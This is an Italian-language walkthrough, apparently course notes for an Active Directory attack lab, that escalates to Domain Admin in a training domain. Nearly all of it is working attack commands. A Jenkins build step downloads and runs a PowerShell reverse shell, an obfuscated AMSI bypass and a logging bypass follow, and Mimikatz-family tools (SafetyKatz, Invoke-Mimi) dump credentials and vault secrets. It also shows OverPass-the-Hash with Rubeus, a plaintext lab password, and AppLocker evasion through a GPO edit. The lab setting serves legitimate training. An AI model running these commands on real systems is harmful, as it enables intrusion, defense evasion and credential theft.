# LEARNING OBJECTIVE7

<div data-full-width="true"><figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

1. Identifica una macchina nel dominio target dove una sessione Domain Admins e' disponibile
2. Compromettere la macchina e scalare i privilegi a Domain Admin abusando di una rev-shell su dcorp-ci
3.  Scalare i privilegi a Domain Admins abusando il local admin di dcorp-adminsrv. Su dcorp-adminsrv, gestire l'elenco delle applicazioni consentite utilizzando:

    * Errori nelle regole Applocker
    * Disabilita Applocker modificando la GPO applicabile a dcorp-adminsrv

    ### SVOLGIMENTO

1.Eseguire InviShell, creare lista server (se e' possibile poiche piu OPSEC) ed eseguire Invoke-SessionHunter

```powershell
RunWithRegistryNonAdmin.bat
```

```powershell
 . C:\AD\Tools\Invoke-SessionHunter.ps1
```

```powershell
 Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt.txt | select Hostname,UserSession,Access
```

servers.txt

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Ci sono diverse sessioni admin ma non abbiamo attualmente accesso, proviamo a rieseguire con jenkins la rev shell

#### Utilizzando i privilegi dell'utente del servizio Jenkins su 172.16.3.11:8080, ottenere i privilegi su 172.16.3.11, il dcorp-ci server

Navigare su 172.16.3.11:8080 ed eseguire il login usando le default credentials <kbd>builduser:builduser</kbd>

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Selezionare un progetto dalla liste e modificarlo

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Cliccare su <kbd>Configure</kbd> e poi selezionare <kbd>Execute Windows Batch Command</kbd> nel menu <kbd>Add build step</kbd> inserendo il seguente payload:

```
powershell iex(iwr http://172.16.100.178/Zainetti.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.178 -Port 443
```

prerequisiti:

* Host Invoke-PowerShellTcp con hfs (io l ho chiamato Zainetti)
* Aggiungi eccezione firewall sulla student vm (172.16.100.178) oppure disattivalo completamente, siamo gia' admin grazie all'abuso locale su AbyssServer.
* Attiva listener netcat su student vm

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

ESECUZIONE REVSHELL VIA JENKINS GUI E RELATIVO ACCESSO SU dcorp-ci.dollarcorp.moneycorp.local

Clicchiamo su <kbd>Build Now</kbd> nella GUI di Jenkins e BOOM!

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo ottenuto una reverse-shell su <kbd>dcorp-ci</kbd> come <kbd>ciadmin</kbd> sfruttando Jenkins.

Possiamo usare `Find-DomainUserLocation` di Powerview con la  reverse-shell  per cercare i computer su cui è connesso un amministratore di dominio. Per prima cosa, dobbiamo bypassare AMSI e lo script block logging .

Per prima cosa, bypassiamo script block logging in modo che il bypass di AMSI non venga registrato. Potremmo anche usare questi bypass nel cradle iniziale di download-esecuzione che abbiamo usato in Jenkins.

```powershell
iex (iwr http://172.16.100.178/sbloggingbypass.txt -UseBasicParsing)
(Esecuzione in memoria di sbloggingbypass, hostato dalla student vm con hfs)

```

Eseguiamo Bypass AMSI

```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Caricamento PowerView ed esecuzione `Find-DomainUserLocation`

```powershell
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
```

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

```powershell
winrs -r:dcorp-mgmt cmd /c "set hostname && set computername"
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Ora eseguiremo SafetyKatz.exe su <kbd>dcorp-mgmt</kbd> per estrarre le credenziali da esso. Per farlo, dobbiamo copiare Loader.exe su dcorp-mgmt. Scarichiamo <kbd>Loader.exe su dcorp-ci e copiamolo da lì su dcorp-mgmt</kbd>. Questo per evitare qualsiasi attività di download su dcorp-mgmt.

Esegui il seguente comando sulla reverse-shell:

```powershell
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
(Scarichiamo su dcorp-ci usando hfs Loader.exe)
```

Adesso copiamo Loader.exe da <kbd>dcorp-ci</kbd> a <kbd>dcorp-mgmt</kbd>&#x20;

```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Utilizzando winrs, aggiungere il seguente port forwarding su <kbd>dcorp-mgmt</kbd> per evitare il rilevamento su dcorp-mgmt:

```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.178"
```

Si prega di notare che è necessario utilizzare la variabile $null per risolvere i problemi di reindirizzamento dell'output.

Per eseguire SafetyKatz su dcorp-mgmt, lo scaricheremo ed eseguiremo in memoria utilizzando Loader. Eseguire il seguente comando sulla rev-shell&#x20;

```powershell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Ottimo! Abbiamo ottenuto le credenziali di svcadmin, un amministratore di dominio. Si noti che svcadmin viene utilizzato come account di servizio (vedere “Sessione” nell'output sopra), quindi è possibile ottenere le credenziali in chiaro da lsasecrets!

Utilizzare OverPass-the-Hash per riprodurre le credenziali svcadmin\
Infine, utilizzare OverPass-the-Hash per utilizzare le credenziali svcadmin.

Eseguire i comandi riportati di seguito da una shell con privilegi elevati sulla VM dello studente per utilizzare Rubeus. Si noti che è possibile utilizzare qualsiasi strumento desiderato (Invoke-Mimi, SafetyKatz, Rubeus ecc.):

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Nel nuovo prompt verificare l'accesso al dc come svcadmin usando <kbd>winrs</kbd>

```powershell
winrs -r:dcorp-dc cmd /c set username
```

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

### 2.Abuse Derivative Local Admin

Passando ora al compito successivo, dobbiamo passare all'amministratore di dominio utilizzando l'amministratore locale derivato. Scopriamo su quali macchine abbiamo i privilegi di amministratore locale. In una sessione PowerShell avviata utilizzando Invisi-Shell, inserisci il seguente comando.

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```powershell
Find-PSRemotingLocalAdminAccess
```

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Abbiamo un amministratore locale su dcorp-adminsrv. Noterete che qualsiasi tentativo di eseguire Loader.exe (per eseguire SafetKatz dalla memoria) genera l'errore "This program is blocked by group policy. For more information, contact your system administrator". Qualsiasi tentativo di eseguire Invoke-Mimi su dcorp-adminsrv genera errori relativi alla modalità lingua. Ciò potrebbe essere dovuto a un elenco di applicazioni consentite su dcorp-adminsrv e al passaggio a una Constrained Language Mode (CLM) durante l'utilizzo di PSRemoting.

Verifichiamo se Applocker è configurato su dcorp-adminsrv interrogando le chiavi di registro. Si noti che stiamo supponendo che reg.exe sia autorizzato all'esecuzione.

```powershell
winrs -r:dcorp-adminsrv cmd
```

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Sembra che Applocker sia configurato. Dopo aver esaminato le politiche, possiamo capire che i file binari e gli script firmati da Microsoft sono consentiti a tutti gli utenti, ma nient'altro. Tuttavia, questa regola particolare è eccessivamente permissiva!

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\
```

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

APrire un nuovo prompt con Invishell ed eseguire il seguente comando per accedere a dcorp-adminsrv

```powershell
Enter-PSSession dcorp-adminsrv
```

```powershell
$ExecutionContext.SessionState.LanguageMode
```

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

A conferma di quanto scoperto con reg query prima eseguiamo il seguente comando per verificare le  policy di AppLocker

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

Qui, “Everyone” possono eseguire script dalla directory Programmi. Ciò significa che possiamo inserire gli script nella directory Programmi ed eseguirli. Inoltre, nella modalità Constrained Language Mode, non è possibile eseguire script utilizzando il dot sourcing (. .\Invoke-Mimi.ps1). Pertanto, è necessario modificare Invoke-Mimi.ps1 per includere la chiamata di funzione nello script stesso e trasferire lo script modificato (Invoke-MimiEx.ps1) al server di destinazione.

* Crea una copia di Invoke-Mimi.ps1 e rinominala Invoke-MimiEx-keys-stdx.ps1 (dove x è il tuo ID studente).
* Apri Invoke-MimiEx-keys-stdx.ps1 in PowerShell ISE (fai clic con il pulsante destro del mouse e seleziona Modifica).
* Aggiungi il valore codificato riportato di seguito per “sekurlsa::ekeys” alla fine del file.

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

Copiamo lo script modificato sul host <kbd>dcorp-adminsrv</kbd> e lo eseguiamo

```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-std460.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\'Program Files'
```

<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

Abbiamo recuperato le credenziali di <kbd>appadmin, websvc, dcorp-adminsrv$</kbd>

### Creare Invoke-MimiEx-vault-std460.ps1

\
Come abbiamo discusso durante la lezione, esistono altri luoghi in cui cercare le credenziali. Modifichiamo Invoke-MimiEx e cerchiamo le credenziali nel Vault delle credenziali di Windows. Sulla macchina virtuale dello studente:

* Creare una copia di Invoke-Mimi.ps1 e rinominarla Invoke-MimiEx-vault-stdx.ps1 (dove x è il proprio ID studente).
* Aprire Invoke-MimiEx-vault-stdx.ps1 in PowerShell ISE (fare clic con il pulsante destro del mouse e selezionare Modifica).
* Sostituisci “Invoke-Mimi -Command ‘”sekurlsa::ekeys“’ ” che abbiamo aggiunto in precedenza con “Invoke-Mimi -Command ‘”token::elevate“ ”vault::cred /patch“’ ” (senza virgolette).
* Copia Invoke-MimiEx-vault-stdx.ps1 in dcorp-adminsrv ed eseguilo. Ricorda che il processo di copia richiederà alcuni minuti.

<figure><img src="../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

Copiamo di nuovo lo script sotto Program File sul host dcorp-adminsrv

```powershell
 Copy-Item C:\AD\Tools\Invoke-MimiVault-std460.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\'Program Files'
```

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

Abbiamo trovato anche le credenziali dell'utente srvadmin:TheKeyUs3ron@anyMachine!

Fantastico! Abbiamo ottenuto le credenziali dell'utente srvadmin in chiaro! Avvia un processo cmd utilizzando runas. Esegui il comando seguente da una shell con privilegi elevati:

```powershell
runas /user:dcorp\srvadmin /netonly cmd
```

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

Il nuovo processo avviato dispone dei privilegi srvadmin. Verificare se srvadmin dispone dei privilegi di amministratore su qualsiasi altro computer.

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```powershell
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

Abbiamo accesso amministrativo locale sul server dcorp-mgmt come srvadmin e sappiamo già che su quella macchina è presente una sessione di svcadmin.

Usiamo SafetyKatz per estrarre le credenziali dalla macchina. Esegui i comandi riportati di seguito dal processo in esecuzione come srvadmin.

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

Aggiungere il portproxy se non e' gia' stato fatto in precedenza o si e' revertato la sessione

```powershell
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.60"
```

Poi eseguiamo SafetyKatz.exe su <kbd>dcorp-mgmt</kbd>

```powershell
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Disabilitare Applocker su dcorp-adminsrv modificando GPO\
Ricordiamo che abbiamo enumerato che student460 e ha Controllo Full Control/Generic All sulla policy di gruppo Applocked. Apportiamo delle modifiche alla politica di gruppo e disabilitiamo Applocker su dcorp-adminsrv.

Per farlo abbiamo bisogno della Console di gestione delle politiche di gruppo. Poiché la VM dello studente è una macchina Server 2022, possiamo installarla seguendo questi passaggi: Aprire Server Manager -> Aggiungi ruoli e funzionalità -> Avanti -> Funzionalità -> Selezionare Gestione criteri di gruppo -> Avanti -> Installa

Al termine dell'installazione, avviare gpmc. Dobbiamo avviare un processo come studentx utilizzando runas, altrimenti gpmc non ottiene il contesto utente. Eseguire il comando seguente da una shell con privilegi elevati:

```
runas /user:dcorp\studentx /netonly cmd
```

Eseguire il seguente comando nel nuovo prompt spawnato a seguito del runas

```
gpmc.msc
```

Navighiamo fino ad AppLocker

<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

Tasto destro e poi 'Edit', nel nuovo editor navigare fino a AppLocker

<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

Cliccare su Executable Rules e poi rimuoverla

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

Forzare l'aggiornamento delle policy invece di attendere quello automatico, poiche abbiamo gia accesso su dcorp-adminsrv

```
winrs -r:dcorp-adminsrv cmd
```

```
gpupdate /force
```

<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
```

```
winrs -r:dcorp-adminsrv cmd
```

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

<div data-full-width="true"><figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure></div>

Adesso possiamo eseguire SafetyKatz

```powershell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

Ottimo! Siamo riusciti a disabilitare Applocker. Si prega di notare che la modifica al GPO non è sicura dal punto di vista OPSEC, ma è comunque comunemente abusata dagli autori delle minacce.
